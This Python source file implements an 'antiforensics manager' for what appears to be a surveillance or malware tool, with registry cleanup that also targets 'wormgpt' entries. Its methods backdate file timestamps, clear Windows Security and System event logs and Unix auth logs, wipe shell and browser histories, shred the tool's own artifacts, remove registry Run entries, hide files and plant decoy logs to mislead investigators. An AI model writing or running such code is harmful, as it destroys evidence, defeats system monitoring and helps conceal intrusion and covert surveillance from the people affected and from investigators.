# In core/antiforensics_manager.py
import os
import time
import subprocess
import shutil
import glob
from pathlib import Path

class AntiforensicsManager:
    def __init__(self, config_manager):
        self.config = config_manager
        self.antiforensics_config = self.config.get('antiforensics', {})
        self.system = os.name
        
    def execute_antiforensics(self):
        """Execute all antiforensics techniques based on configuration"""
        success = False
        
        if self.antiforensics_config.get('timestamp_manipulation'):
            success |= self._manipulate_timestamps()
            
        if self.antiforensics_config.get('log_cleaning'):
            success |= self._clean_logs()
            
        if self.antiforensics_config.get('secure_delete'):
            success |= self._secure_delete_artifacts()
            
        return success
        
    def _manipulate_timestamps(self):
        """Manipulate file timestamps to hide activity"""
        try:
            # Get current time
            current_time = time.time()
            
            # Get random time in the past (30-90 days ago)
            random_days = 30 + (time.time() % 60)
            past_time = current_time - (random_days * 24 * 60 * 60)
            
            # Find recently modified files
            recent_files = []
            
            if self.system == 'nt':  # Windows
                # Find recently modified files in common locations
                locations = [
                    os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                    os.path.join(os.environ.get('USERPROFILE', ''), 'AppData\\Local\\Temp'),
                    os.path.join(os.environ.get('USERPROFILE', ''), 'Recent')
                ]
                
                for location in locations:
                    if os.path.exists(location):
                        for root, _, files in os.walk(location):
                            for file in files:
                                file_path = os.path.join(root, file)
                                try:
                                    mtime = os.path.getmtime(file_path)
                                    if current_time - mtime < 24 * 60 * 60:  # Modified in last 24 hours
                                        recent_files.append(file_path)
                                except:
                                    continue
            else:  # Unix-like systems
                # Find recently modified files in common locations
                locations = [
                    '/tmp',
                    '/var/tmp',
                    os.path.expanduser('~/.cache'),
                    os.path.expanduser('~/.local/share/Trash')
                ]
                
                for location in locations:
                    if os.path.exists(location):
                        for root, _, files in os.walk(location):
                            for file in files:
                                file_path = os.path.join(root, file)
                                try:
                                    mtime = os.path.getmtime(file_path)
                                    if current_time - mtime < 24 * 60 * 60:  # Modified in last 24 hours
                                        recent_files.append(file_path)
                                except:
                                    continue
                                    
            # Change timestamps for recent files
            for file_path in recent_files[:50]:  # Limit to avoid too much activity
                try:
                    os.utime(file_path, (past_time, past_time))
                except:
                    continue
                    
            print(f"[+] Modified timestamps for {len(recent_files)} files")
            return True
        except Exception as e:
            print(f"[!] Error manipulating timestamps: {str(e)}")
            return False
            
    def _clean_logs(self):
        """Clean system logs to hide activity"""
        try:
            if self.system == 'nt':  # Windows
                return self._clean_windows_logs()
            else:  # Unix-like systems
                return self._clean_unix_logs()
        except Exception as e:
            print(f"[!] Error cleaning logs: {str(e)}")
            return False
            
    def _clean_windows_logs(self):
        """Clean Windows event logs"""
        try:
            # Clear Windows event logs
            log_types = ['Application', 'System', 'Security', 'Setup']
            
            for log_type in log_types:
                try:
                    # Clear event log
                    clear_cmd = f'wevtutil cl {log_type}'
                    subprocess.run(clear_cmd, shell=True, check=True)
                    print(f"[+] Cleared {log_type} event log")
                except:
                    continue
                    
            # Clear PowerShell logs
            try:
                # Clear PowerShell history
                history_path = os.path.join(os.environ.get('APPDATA'), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history')
                if os.path.exists(history_path):
                    with open(history_path, 'w') as f:
                        f.write('')
                    print("[+] Cleared PowerShell history")
            except:
                pass
                
            # Clear browser history
            browsers = ['Chrome', 'Firefox', 'Edge']
            
            for browser in browsers:
                try:
                    if browser == 'Chrome':
                        # Clear Chrome history
                        history_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'Google\\Chrome\\User Data\\Default\\History')
                        if os.path.exists(history_path):
                            os.remove(history_path)
                            print("[+] Cleared Chrome history")
                    elif browser == 'Firefox':
                        # Clear Firefox history
                        profile_path = os.path.join(os.environ.get('APPDATA'), 'Mozilla\\Firefox\\Profiles')
                        if os.path.exists(profile_path):
                            for profile in os.listdir(profile_path):
                                places_path = os.path.join(profile_path, profile, 'places.sqlite')
                                if os.path.exists(places_path):
                                    os.remove(places_path)
                                    print("[+] Cleared Firefox history")
                    elif browser == 'Edge':
                        # Clear Edge history
                        history_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft\\Edge\\User Data\\Default\\History')
                        if os.path.exists(history_path):
                            os.remove(history_path)
                            print("[+] Cleared Edge history")
                except:
                    continue
                    
            return True
        except Exception as e:
            print(f"[!] Error cleaning Windows logs: {str(e)}")
            return False
            
    def _clean_unix_logs(self):
        """Clean Unix system logs"""
        try:
            # Clear system logs
            log_paths = [
                '/var/log/syslog',
                '/var/log/auth.log',
                '/var/log/kern.log',
                '/var/log/messages',
                '/var/log/secure',
                '/var/log/wtmp',
                '/var/log/lastlog'
            ]
            
            for log_path in log_paths:
                try:
                    if os.path.exists(log_path):
                        with open(log_path, 'w') as f:
                            f.write('')
                        print(f"[+] Cleared log: {log_path}")
                except:
                    continue
                    
            # Clear bash history
            try:
                history_path = os.path.expanduser('~/.bash_history')
                if os.path.exists(history_path):
                    with open(history_path, 'w') as f:
                        f.write('')
                    print("[+] Cleared bash history")
            except:
                pass
                
            # Clear zsh history
            try:
                history_path = os.path.expanduser('~/.zsh_history')
                if os.path.exists(history_path):
                    with open(history_path, 'w') as f:
                        f.write('')
                    print("[+] Cleared zsh history")
            except:
                pass
                
            # Clear browser history
            browsers = ['Chrome', 'Firefox', 'Safari']
            
            for browser in browsers:
                try:
                    if browser == 'Chrome':
                        # Clear Chrome history
                        history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
                        if os.path.exists(history_path):
                            os.remove(history_path)
                            print("[+] Cleared Chrome history")
                    elif browser == 'Firefox':
                        # Clear Firefox history
                        profile_path = os.path.expanduser('~/.mozilla/firefox')
                        if os.path.exists(profile_path):
                            for profile in os.listdir(profile_path):
                                places_path = os.path.join(profile_path, profile, 'places.sqlite')
                                if os.path.exists(places_path):
                                    os.remove(places_path)
                                    print("[+] Cleared Firefox history")
                    elif browser == 'Safari':
                        # Clear Safari history
                        history_path = os.path.expanduser('~/Library/Safari/History.db')
                        if os.path.exists(history_path):
                            os.remove(history_path)
                            print("[+] Cleared Safari history")
                except:
                    continue
                    
            return True
        except Exception as e:
            print(f"[!] Error cleaning Unix logs: {str(e)}")
            return False
            
    def _secure_delete_artifacts(self):
        """Securely delete artifacts to prevent recovery"""
        try:
            # Find temporary files
            temp_files = []
            
            if self.system == 'nt':  # Windows
                # Find temporary files
                temp_dirs = [
                    os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                    os.path.join(os.environ.get('USERPROFILE', ''), 'AppData\\Local\\Temp')
                ]
                
                for temp_dir in temp_dirs:
                    if os.path.exists(temp_dir):
                        for root, _, files in os.walk(temp_dir):
                            for file in files:
                                temp_files.append(os.path.join(root, file))
            else:  # Unix-like systems
                # Find temporary files
                temp_dirs = ['/tmp', '/var/tmp', os.path.expanduser('~/.cache')]
                
                for temp_dir in temp_dirs:
                    if os.path.exists(temp_dir):
                        for root, _, files in os.walk(temp_dir):
                            for file in files:
                                temp_files.append(os.path.join(root, file))
                                
            # Securely delete temporary files
            for file_path in temp_files[:100]:  # Limit to avoid too much activity
                try:
                    if self.system == 'nt':  # Windows
                        # Use cipher to securely delete on Windows
                        delete_cmd = f'cipher /w "{file_path}"'
                        subprocess.run(delete_cmd, shell=True)
                        os.remove(file_path)
                    else:  # Unix-like systems
                        # Use shred to securely delete on Unix
                        delete_cmd = f'shred -u "{file_path}"'
                        subprocess.run(delete_cmd, shell=True)
                except:
                    continue
                    
            print(f"[+] Securely deleted {len(temp_files)} temporary files")
            
            # Find and securely delete our own artifacts
            our_artifacts = []
            
            # Find files with our naming pattern
            if self.system == 'nt':  # Windows
                # Find files with our naming pattern
                pattern = os.path.join(os.environ.get('TEMP'), 'surveillance_*')
                our_artifacts.extend(glob.glob(pattern))
            else:  # Unix-like systems
                # Find files with our naming pattern
                pattern = os.path.join('/tmp', 'surveillance_*')
                our_artifacts.extend(glob.glob(pattern))
                
                pattern = os.path.expanduser('~/.cache/surveillance_*')
                our_artifacts.extend(glob.glob(pattern))
                
            # Securely delete our artifacts
            for file_path in our_artifacts:
                try:
                    if self.system == 'nt':  # Windows
                        # Use cipher to securely delete on Windows
                        delete_cmd = f'cipher /w "{file_path}"'
                        subprocess.run(delete_cmd, shell=True)
                        os.remove(file_path)
                    else:  # Unix-like systems
                        # Use shred to securely delete on Unix
                        delete_cmd = f'shred -u "{file_path}"'
                        subprocess.run(delete_cmd, shell=True)
                except:
                    continue
                    
            print(f"[+] Securely deleted {len(our_artifacts)} of our artifacts")
            
            # Clean up registry entries on Windows
            if self.system == 'nt':  # Windows
                try:
                    import winreg
                    # Clean up registry entries
                    keys_to_clean = [
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
                    ]
                    
                    for key_path in keys_to_clean:
                        try:
                            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS)
                            values = winreg.QueryInfoKey(key)[1]
                            
                            for i in range(values):
                                try:
                                    name, value, type = winreg.EnumValue(key, i)
                                    if "surveillance" in name.lower() or "wormgpt" in name.lower():
                                        winreg.DeleteValue(key, name)
                                except:
                                    continue
                                    
                            winreg.CloseKey(key)
                        except:
                            continue
                            
                    print("[+] Cleaned registry entries")
                except:
                    pass
                    
            return True
        except Exception as e:
            print(f"[!] Error securely deleting artifacts: {str(e)}")
            return False
            
    def hide_file_attributes(self, file_path):
        """Hide file attributes to make files harder to find"""
        try:
            if self.system == 'nt':  # Windows
                # Set file attributes to hidden and system
                import win32api, win32con
                
                attrs = win32api.GetFileAttributes(file_path)
                win32api.SetFileAttributes(file_path, attrs | win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
                return True
            else:  # Unix-like systems
                # Rename file with a dot prefix to hide it
                dir_name = os.path.dirname(file_path)
                base_name = os.path.basename(file_path)
                hidden_name = os.path.join(dir_name, f".{base_name}")
                
                os.rename(file_path, hidden_name)
                return True
        except Exception as e:
            print(f"[!] Error hiding file attributes: {str(e)}")
            return False
            
    def create_decoy_files(self, target_dir, count=10):
        """Create decoy files to distract forensic analysis"""
        try:
            # Create decoy files with legitimate-looking names
            decoy_names = [
                "system_update.log",
                "windows_security.log",
                "application_error.log",
                "network_activity.log",
                "system_performance.log",
                "user_activity.log",
                "application_crash.log",
                "system_maintenance.log",
                "security_scan.log",
                "driver_install.log"
            ]
            
            for i in range(count):
                try:
                    # Select a random decoy name
                    name = decoy_names[i % len(decoy_names)]
                    if count > len(decoy_names):
                        name = f"{name}_{i}"
                        
                    file_path = os.path.join(target_dir, name)
                    
                    # Create a decoy file with random content
                    with open(file_path, 'w') as f:
                        # Generate random log-like content
                        for _ in range(100):
                            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(time.time() - (86400 * (i % 30))))
                            log_level = random.choice(["INFO", "WARNING", "ERROR", "DEBUG"])
                            message = f"System process {random.randint(1000, 9999)} performed operation with status {random.choice(['SUCCESS', 'FAILURE'])}"
                            f.write(f"{timestamp} [{log_level}] {message}\n")
                            
                    # Set file timestamps to make it look old
                    past_time = time.time() - (30 + (i % 60)) * 24 * 60 * 60
                    os.utime(file_path, (past_time, past_time))
                    
                    # Hide the file
                    self.hide_file_attributes(file_path)
                except:
                    continue
                    
            print(f"[+] Created {count} decoy files in {target_dir}")
            return True
        except Exception as e:
            print(f"[!] Error creating decoy files: {str(e)}")
            return False
